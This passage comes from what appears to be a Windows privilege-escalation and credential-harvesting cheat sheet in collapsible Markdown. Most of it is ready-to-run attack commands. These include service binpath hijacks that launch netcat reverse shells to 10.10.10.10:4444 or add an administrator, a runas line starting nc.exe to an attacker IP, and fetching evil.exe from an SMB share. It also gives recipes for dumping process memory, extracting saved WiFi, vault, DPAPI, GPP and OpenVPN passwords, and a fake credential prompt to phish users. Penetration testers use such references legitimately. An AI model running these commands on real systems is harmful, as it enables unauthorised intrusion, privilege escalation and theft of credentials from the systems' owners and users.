		* You can create a memory dump of a running process using procdump from sysinternals. Services like FTP have the credentials in clear text in memory, try to dump the memory and read the credentials.

				procdump.exe -accepteula -ma <proc_name_tasklist>
	* <details><summary>Insecure GUI apps (Click to expand)</summary><p>
		* Applications running as SYSTEM may allow an user to spawn a CMD, or browse directories.
		* Example
			1. **Windows Help and Support** (Windows + F1)
			1. Search for **command prompt**
			1. Click on **Click to open Command Prompt**
* <details><summary>Services (Click to expand)</summary><p>
	* Get a list of services

			net start
	* wmic service list brief

			sc query
			Get-Service
	* <details><summary>Permissions (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* Download `accesschk.exe` for XP -<br />[https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
		* <details><summary>Overview (Click to expand)</summary><p>
			* You can use sc to get information of a service
			
					sc qc <service_name>
			* It is recommended to have the binary accesschk from Sysinternals to check the required privilege level for each service.

					accesschk.exe -ucqv <Service_Name> #Check rights for different groups
			* It is recommended to check if "Authenticated Users" can modify any service:

					accesschk.exe -uwcqv "Authenticated Users" * /accepteula
					accesschk.exe -uwcqv %USERNAME% * /accepteula
					accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
					accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
	* <details><summary>Enable service (Click to expand)</summary><p>
		* <details><summary>Overview (Click to expand)</summary><p>
			* If you are having this error (for example with SSDPSRV): `System error 1058 has occurred.`, then the service cannot be started. The error is caused by either the service being disabled or because the service has no enabled devices associated with it.
			* The service `upnphost` depends on SSDPSRV to work (for `XP SP1`)
			* Other Permissions can be used to escalate privileges:
				* `SERVICE_CHANGE_CONFIG` - Can reconfigure the service binary
				* `WRITE_DAC` - Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG
				* `WRITE_OWNER` -  Can become owner, reconfigure permissions
				* `GENERIC_WRITE` -  Inherits SERVICE_CHANGE_CONFIG
				* `GENERIC_ALL` -  Inherits SERVICE_CHANGE_CONFIG
		* Enable Service Process
			1. Run these commands

					sc config SSDPSRV start= demand
					sc config SSDPSRV obj= ".\LocalSystem" password= ""
		* Another workaround of this problem is running:

				sc.exe config usosvc start= auto
		* Modify service binary path
			* If the group "Authenticated users" has SERVICE_ALL_ACCESS in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:

					sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
					sc config <Service_Name> binpath= "net localgroup administrators username /add"
					sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

					sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
			* Restart service

					wmic service NAMEOFSERVICE call startservice
					net stop [service name] && net start [service name]
		* To detect and exploit this vulnerability you can use `exploit/windows/local/service_permissions`
	* <details><summary>Services binaries with weak permissions (Click to expand)</summary><p>
		* Check if you can modify the binary that is executed by a service or if you have write permissions on the folder where the binary is located ().
		* You can get every binary that is executed by a service using wmic (not in system32) and check your permissions using icacls:

				for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
				for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
		* You can also use sc and icacls:

				sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
				FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
				FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
		* Services registry modify permissions
			* You should check if you can modify any service registry.
			* You can check your permissions over a service registry doing:

					reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
		* Try to write every service with its current content (to check if you have write permissions)

				for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
				get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
		* Check if `Authenticated Users` or `NT AUTHORITY\INTERACTIVE` have `FullControl`. In that case you can change the binary that is going to be executed by the service.
		* To change the Path of the binary executed:

				reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
	* Services registry AppendData/AddSubdirectory permissions
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: AppendData/AddSubdirectory permission over service registry -<br />[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/appenddata-addsubdirectory-permission-over-service-registry](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/appenddata-addsubdirectory-permission-over-service-registry)
		* <details><summary>Overview (Click to expand)</summary><p>
			* If you have this permission over a registry this means to you can create sub registries from this one. In case of Windows services this is enough to execute arbitrary code:
	* <details><summary>Unquoted Service Paths (Click to expand)</summary><p>
		* If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.
		* For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:
			* `C:\Program.exe `
			* `C:\Program Files\Some.exe `
			* `C:\Program Files\Some Folder\Service.exe`
		* To list all unquoted service paths (minus built-in Windows services)

				wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
				wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """
			* Not only auto services
			* Other way

					for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
					for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
					echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
					gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
			* You can detect and exploit this vulnerability with metasploit: exploit/windows/local/trusted_service_path
			* You can manually create a service binary with metasploit:

					msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
			* Recovery Actions
			* It's possible to indicate Windows what it should do. If that setting is pointing a binary and this binary can be overwritten you may be able to escalate privileges.
* <details><summary>Applications (Click to expand)</summary><p>
	* Installed Applications
		* Check permissions of the binaries (maybe you can overwrite one and escalate privileges) and of the folders (
		).

					dir /a "C:\Program Files"
					dir /a "C:\Program Files (x86)"
					reg query HKEY_LOCAL_MACHINE\SOFTWARE
					Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
					Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
	* <details><summary>Write Permissions (Click to expand)</summary><p>
		* Check if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account (schedtasks).
		* A way to find weak folder/files permissions in the system is doing:

				accesschk.exe /accepteula
	* <details><summary>Find all weak folder permissions per drive. (Click to expand)</summary><p>

			accesschk.exe -uwdqs Users c:\
			accesschk.exe -uwdqs "Authenticated Users" c:\
			accesschk.exe -uwdqs "Everyone" c:\
	* <details><summary>Find all weak file permissions per drive. (Click to expand)</summary><p>
		* .

				accesschk.exe -uwqs Users c:\*.*
			* <details><summary>Sample Output (Click to expand)</summary><p>

					.
		* .

				accesschk.exe -uwqs "Authenticated Users" c:\*.*
			* <details><summary>Sample Output (Click to expand)</summary><p>

					.
		* .

				accesschk.exe -uwdqs "Everyone" c:\*.*
			* <details><summary>Sample Output (Click to expand)</summary><p>

					.
		* Command Shell icacls 1

				icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
			* <details><summary>Sample Output (Click to expand)</summary><p>

					C:\Program Files\Common Files NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\desktop.ini BUILTIN\Administrators:(F)
					C:\Program Files\HPPrintScanDoctor NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\Internet Explorer NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Microsoft Office NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\Microsoft Office 15 NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\Microsoft OneDrive NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\Microsoft Update Health Tools NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\ModifiableWindowsApps NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Mozilla Firefox NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\Uninstall Information NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\VMware NT SERVICE\TrustedInstaller:(I)(F)
					C:\Program Files\Windows Defender NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Defender Advanced Threat Protection NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Mail NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Media Player NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Multimedia Platform NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows NT NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Photo Viewer NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Portable Devices NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Security NT SERVICE\TrustedInstaller:(F)
					C:\Program Files\Windows Sidebar NT SERVICE\TrustedInstaller:(F)
		* Command Shell icacls 2

				icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
			* <details><summary>Sample Output (Click to expand)</summary><p>

					.
		* PowerShell 1

				Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
			* <details><summary>Sample Output (Click to expand)</summary><p>

					.
		* PowerShell 2

				Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
			* <details><summary>Sample Output (Click to expand)</summary><p>

					.
	* <details><summary>Run at startup (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: Privilege Escalation with Autoruns -<br />[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)
		* <details><summary>Overview (Click to expand)</summary><p>
			* Check if you can overwrite some registry or binary that is going to be executed by a different user.
			* Read the following page to learn more about interesting autoruns locations to escalate privileges:
	* <details><summary>Drivers (Click to expand)</summary><p>
		* Look for possible third party weird/vulnerable drivers
			* Command Shell
				* driveryquery

						driverquery
					* <details><summary>Sample Output (Click to expand)</summary><p>

							Module Name  Display Name           Driver Type   Link Date
							============ ====================== ============= ======================
							1394ohci     1394 OHCI Compliant Ho Kernel
							3ware        3ware                  Kernel        5/18/2015 6:28:03 PM
							ACPI         Microsoft ACPI Driver  Kernel
							AcpiDev      ACPI Devices driver    Kernel
							acpiex       Microsoft ACPIEx Drive Kernel
							acpipagr     ACPI Processor Aggrega Kernel
							AcpiPmi      ACPI Power Meter Drive Kernel
							acpitime     ACPI Wake Alarm Driver Kernel
							Acx01000     Acx01000               Kernel
							ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
							AFD          Ancillary Function Dri Kernel
							afunix       afunix                 Kernel
							ahcache      Application Compatibil Kernel
							<TRUNCATED LONG LIST>
					* Parameters
						* `/FO` - format. "TABLE", "LIST", "CSV".
						* `/SI` - Provides information about signed drivers.
* <details><summary>DLL Hijacking (Click to expand)</summary><p>
	* <details><summary>PATH DLL Hijacking (Click to expand)</summary><p>
		* If you have write permissions inside a folder present on PATH you could be able to hijack a DLL loaded by a process and escalate privileges.
		* Check permissions of all folders inside PATH

				for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
* <details><summary>Network (Click to expand)</summary><p>
	* <details><summary>Shares (Click to expand)</summary><p>
		* Get a list of computers
			* Command Shell

					net view
				* <details><summary>Sample Output (Click to expand)</summary><p>

						.
		* Shares on the domains
			* Command Shell

					net view /all /domain [domainname]
				* <details><summary>Sample Output (Click to expand)</summary><p>

						.
		* List shares of a computer
			* Command Shell
		
					net view \\computer /ALL
				* <details><summary>Sample Output (Click to expand)</summary><p>

						.
		* Mount the share locally
			* Command Shell
		
					net use x: \\computer\share
				* <details><summary>Sample Output (Click to expand)</summary><p>

						.
		* Check current shares
			* Command Shell

					net share
				* <details><summary>Sample Output (Click to expand)</summary><p>

						Share name   Resource                        Remark

						-------------------------------------------------------------------------------
						C$           C:\                             Default share
						IPC$                                         Remote IPC
						ADMIN$       C:\Windows                      Remote Admin
						The command completed successfully.
	* <details><summary>hosts file (Click to expand)</summary><p>
		* Check for other known computers hardcoded on the hosts file

				type C:\Windows\System32\drivers\etc\hosts
	* <details><summary>Network Interfaces & DNS (Click to expand)</summary><p>
		* Command Shell

				ipconfig /all
		* PowerShell

				Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
				Get-DnsClientServerAddress -AddressFamily IPv4 | ft
	* <details><summary>Open Ports (Click to expand)</summary><p>
		* Check for restricted services from the outside
		
				netstat -ano #Opened ports?
	* <details><summary>Routing Table (Click to expand)</summary><p>

			route print
			Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
	* <details><summary>ARP Table (Click to expand)</summary><p>

			arp -A
			Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
	* <details><summary>Firewall Rules (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* HackTricks: Fire Commands for Pentesters -<br />[https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters#firewall](https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters#firewall)
			* HackTricks: Network Enumeration Commands -<br />[https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters#network](https://book.hacktricks.xyz/windows/basic-cmd-for-pentesters#network)
* <details><summary>Windows Subsystem for Linux (wsl) (Click to expand)</summary><p>
	* `C:\Windows\System32\bash.exe`
	* `C:\Windows\System32\wsl.exe`
	* Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
	* If you get root user you can listen on any port (the first time you use nc.exe to listen on a port it will ask via GUI if nc should be allowed by the firewall).

			wsl whoami
			./ubuntun1604.exe config --default-user root
			wsl whoami
			wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
	* <details><summary>To easily start bash as root, you can try --default-user root (Click to expand)</summary><p>
		* You can explore the WSL filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`
* <details><summary>Windows Credentials (Click to expand)</summary><p>
	* Winlogon Credentials

			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
	* Other way

			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
			reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
	* <details><summary>Credentials manager, Windows vault (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)]
		* <details><summary>Overview (Click to expand)</summary><p>
			* The Windows Vault stores user credentials for servers, websites and other programs that Windows can log in the users automatically. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.
			* Windows Vault stores credentials that Windows can log in the users automatically, which means that any Windows application that needs credentials to access a resource (server or a website) can make use of this Credential Manager & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.
			* Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow communicate with the credential manager and request the credentials for that resource from the default storage vault.
		* Process
			* Use the cmdkey to list the stored credentials on the machine.

					cmdkey /list
			* Sample Output

					Currently stored credentials (Click to expand)</summary><p>
					Target: Domain:interactive=WORKGROUP\Administrator
					Type: Domain Password
					User: WORKGROUP\Administrator
			* Then you can use runas with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.

				runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
			* Using runas with a provided set of credential.

					C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
		* Tools
			* mimikatz
			* lazagne
			* Credentials File View -<br />[https://www.nirsoft.net/utils/credentials_file_view.html](https://www.nirsoft.net/utils/credentials_file_view.html)
			* VaultPasswordView -<br />[https://www.nirsoft.net/utils/vault_password_view.html](https://www.nirsoft.net/utils/vault_password_view.html)
			* Empire PowerShell Module -<br />[https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)
	* <details><summary>DPAPI (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://en.wikipedia.org/wiki/Security_Identifier](https://en.wikipedia.org/wiki/Security_Identifier)
		* <details><summary>Overview (Click to expand)</summary><p>
			* In theory, the Data Protection API can enable symmetric encryption of any kind of data; in practice, its primary use in the Windows operating system is to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy.
			* DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets, or in the case of system encryption, using the system's domain authentication secrets.
		 	* The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the Security Identifier of that user. The DPAPI key is stored in the same file as the master key that protects the users private keys. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it usingdir from the cmd, but you can list it from PS).
	 	* Process
	 		* .

					Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
					Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
			* You can use mimikatz module `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.
			* The credentials files protected by the master password are usually located in:

					dir C:\Users\username\AppData\Local\Microsoft\Credentials\
					dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
					Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
					Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
			* You can use mimikatz module `dpapi::cred` with the appropiate /masterkey to decrypt.
			* You can extract many DPAPI masterkeys from memory with the `sekurlsa::dpapi` module (if you are root).
	* <details><summary>WiFi (Click to expand)</summary><p>
		* <details><summary>List saved Wifi using (Click to expand)</summary><p>

				netsh wlan show profile
		* <details><summary>To get the clear-text password use (Click to expand)</summary><p>

				netsh wlan show profile <SSID> key=clear
		* <details><summary>Oneliner to extract all wifi passwords (Click to expand)</summary><p>

				cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
		* <details><summary>Saved RDP Connections (Click to expand)</summary><p>
			* You can find them on `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` and in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
		* <details><summary>Recently Run Commands (Click to expand)</summary><p>

				HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
				HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
		* <details><summary>Remote Desktop Credential Manager (Click to expand)</summary><p>
			* `%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings`
			* Use the Mimikatz dpapi::rdg module with appropriate /masterkey to decrypt any .rdg files
			* You can extract many DPAPI masterkeys from memory with the Mimikatz sekurlsa::dpapi module
	* <details><summary>AppCmd.exe (Click to expand)</summary><p>
		* Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.
		* AppCmd.exe is located in the %systemroot%\system32\inetsrv\ directory.
		* If this file exists then it is possible that some credentials have been configured and can be recovered.
			* This code was extracted from PowerUP:
	* <details><summary>SCClient/SCCM (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* enjoiz GitHub: Privec -<br />[https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc)
		* <details><summary>Overview (Click to expand)</summary><p>
			* Check if `C:\Windows\CCM\SCClient.exe` exists.
			* Installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading (Info from ).

					$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
					if ($result) { $result }
					else { Write "Not Installed." }
* <details><summary>Files and Registry (Credentials) (Click to expand)</summary><p>
	* Putty Creds

			reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
	* Putty SSH Host Keys

			reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
	* SSH keys in registry
		* <details><summary>References (Click to expand)</summary><p>
			* ropnop GitHub: Windows SSHAgent Extract -<br />[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)
			* ropnop blog: Extracting SSH Private Keys from Windows 10 SSH Agent -<br />[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
		* <details><summary>Overview (Click to expand)</summary><p>
			* SSH private keys can be stored inside the registry key HKCU\Software\OpenSSH\Agent\Keys  so you should check if there is anything interesting in there
			
					reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
			* If ssh-agent service is not running and you want it to automatically start on boot run:

					Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
			* It looks like this technique isn't valid anymore. I tried to create some ssh keys, add them with ssh-add and login via ssh to a machine. The registry HKCU\Software\OpenSSH\Agent\Keys doesn't exist and procmon didn't identify the use of dpapi.dll during the asymmetric key authentication.
	* Unattended files
		* `C:\Windows\sysprep\sysprep.xml`
		* `C:\Windows\sysprep\sysprep.inf`
		* `C:\Windows\sysprep.inf`
		* `C:\Windows\Panther\Unattended.xml`
		* `C:\Windows\Panther\Unattend.xml`
		* `C:\Windows\Panther\Unattend\Unattend.xml`
		* `C:\Windows\Panther\Unattend\Unattended.xml`
		* `C:\Windows\System32\Sysprep\unattend.xml`
		* `C:\Windows\System32\Sysprep\unattended.xml`
		* `C:\unattend.txt`
		* `C:\unattend.inf`

				dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
	* You can also search for these files using metasploit: post/windows/gather/enum_unattend
		* Example content:

				<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
					<AutoLogon>
					 <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
					 <Enabled>true</Enabled>
					 <Username>Administrator</Username>
					</AutoLogon>
				​
					<UserAccounts>
					 <LocalAccounts>
					  <LocalAccount wcm:action="add">
					   <Password>*SENSITIVE*DATA*DELETED*</Password>
					   <Group>administrators;users</Group>
					   <Name>Administrator</Name>
					  </LocalAccount>
					 </LocalAccounts>
					</UserAccounts>
	* SAM & SYSTEM backups
		* Usually %SYSTEMROOT% = C:\Windows
		* `%SYSTEMROOT%\repair\SAM`
		* `%SYSTEMROOT%\System32\config\RegBack\SAM`
		* `%SYSTEMROOT%\System32\config\SAM`
		* `%SYSTEMROOT%\repair\system`
		* `%SYSTEMROOT%\System32\config\SYSTEM`
		* `%SYSTEMROOT%\System32\config\RegBack\system`
	* Cloud Credentials
	* From user home
		* `.aws\credentials`
		* `AppData\Roaming\gcloud\credentials.db`
		* `AppData\Roaming\gcloud\legacy_credentials`
		* `AppData\Roaming\gcloud\access_tokens.db`
		* `.azure\accessTokens.json`
		* `.azure\azureProfile.json`
		* `McAfee SiteList.xml`
	* Search for a file called `SiteList.xml`
	* Cached GPP Pasword
			* Before KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a custom account. This feature was mainly used to deploy a custom local administrator account on a group of machines. There were two problems with this approach though. First, since the Group Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second problem is that the password set in these GPPs is AES256-encrypted with a default key, which is publicly documented. This means that any authenticated user could potentially access very sensitive data and elevate their privileges on their machine or even the domain. This function will check whether any locally cached GPP file contains a non-empty "cpassword" field. If so, it will decrypt it and return a custom PS object containing some information about the GPP along with the location of the file.
			* Search in `C:\ProgramData\Microsoft\Group Policy\history` or in `C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history` (previous to W Vista) for these files:
				* `Groups.xml`
				* `Services.xml`
				* `Scheduledtasks.xml`
				* `DataSources.xml`
				* `Printers.xml`
				* `Drives.xml`
	* <details><summary>To decrypt the cPassword: (Click to expand)</summary><p>

			gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
	* <details><summary>IIS Web Config (Click to expand)</summary><p>

			Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
		* `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
		* `C:\inetpub\wwwroot\web.config`

				Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
				Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
	* <details><summary>Example of web.config with credentials: (Click to expand)</summary><p>

				<authentication mode="Forms"> 
					<forms name="login" loginUrl="/admin">
						<credentials passwordFormat = "Clear">
							<user name="Administrator" password="SuperAdminPassword" />
						</credentials>
					</forms>
				</authentication>
	* <details><summary>OpenVPN credentials (Click to expand)</summary><p>

			Add-Type -AssemblyName System.Security
			$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
			$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}
	* Other

			foreach ($item in $items)
			{
			  $encryptedbytes=$item.'auth-data'
			  $entropy=$item.'entropy'
			  $entropy=$entropy[0..(($entropy.Length)-2)]
			​
			  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
				$encryptedBytes, 
				$entropy, 
				[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
			 
			  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
			}
	* <details><summary>Logs (Click to expand)</summary><p>
		* IIS

				C:\inetpub\logs\LogFiles\*
		* Apache

				Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
		* Ask for credentials
			* You can always ask the user to enter his credentials of even the credentials of a different user if you think he can know them (notice that asking the client directly for the credentials is really risky):

					$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
					$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
	* <details><summary>Get plaintext (Click to expand)</summary><p>

			$cred.GetNetworkCredential() | fl
	* <details><summary>Possible filenames containing credentials (Click to expand)</summary><p>
		* Known files that some time ago contained passwords in clear-text or Base64
			* `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history`
			* `vnc.ini, ultravnc.ini, *vnc*`
			* `web.config`
			* `php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)`
			* `SiteList.xml #McAfee`
			* `ConsoleHost_history.txt #PS-History`
			* `*.gpg`
			* `*.pgp`
			* `*config*.php`
			* `elasticsearch.y*ml`
			* `kibana.y*ml`
			* `*.p12`
			* `*.der`
			* `*.csr`
			* `*.cer`
			* `known_hosts`
			* `id_rsa`
			* `id_dsa`
			* `*.ovpn`
			* `anaconda-ks.cfg`
